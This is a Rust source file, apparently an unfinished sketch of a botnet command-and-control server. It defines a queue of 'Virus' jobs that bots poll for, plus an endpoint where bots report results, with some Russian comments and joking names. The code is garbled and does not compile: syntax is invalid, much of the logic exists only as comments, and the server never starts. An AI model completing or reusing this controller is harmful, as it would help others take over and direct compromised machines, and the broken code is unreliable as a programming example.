use axum::{
    Json, Router, body, extract::{Path, State}, routing::{get, post},
};
use std::{collections::HashMap, sync::Arc};
use tokio::sync::Mutex;

struct Diddy {
    ip: String,
    ping: u64,
}

struct Virus {
    id: u64,
    url: String,
    status: String,
    out: Option(&str)
}

async fn add_virus(&Arc<BotnetState>: botnetstate,
    &str: url) {
        botnetstate // push (BotnetState {id: botnetstate[-1].id + 1, bytes: virus, status: "edging"})
        // always sort by id after push
}

struct BotnetState {
    que: Mutex<Vec<Virus>>,
    pro: Mutex<HashMap<Diddy, u64>>,
}

#[tokio::main]
async fn main() {
    let state = Arc::new(BotnetState {
        que: Mutex::new(Vec::new()),
        pro: Mutex::new(HashMap::new()),
    });
    let master = Router::new()
        .route("/poll", get(poll_handler))
        .route("/virus_status", post(virus_status_handler))
        .with_state(state);
}

async fn poll_handler(State(state): State<Arc<BotnetState>>) -> String {
    let current_que = *state.que.lock(); // отправляем всю очередь вирусов так чтобы его можно было сереализовать обратно в вектор
    format!("{}", que)
}

// примнять важные  вычисления
#[derive(Deserialize)]
struct VirusResult {
    id: u64,
    status: String,
    out: Vec<u8>
}
async fn virus_status_handler(
    State(state): State<Arc<BotnetState>>,
    Json(body): Json<VirusResult>
) -> String {
    let mut current_que = state.que.lock();
    match body.status {
        // blocking virus
        "cooked" => {
            // binary search by body.id
            *current_que. // out = body.out
            // status = cooked
        }

        "fifty" => {
            // status = fifty
            // out = body.out
        }
    }
}
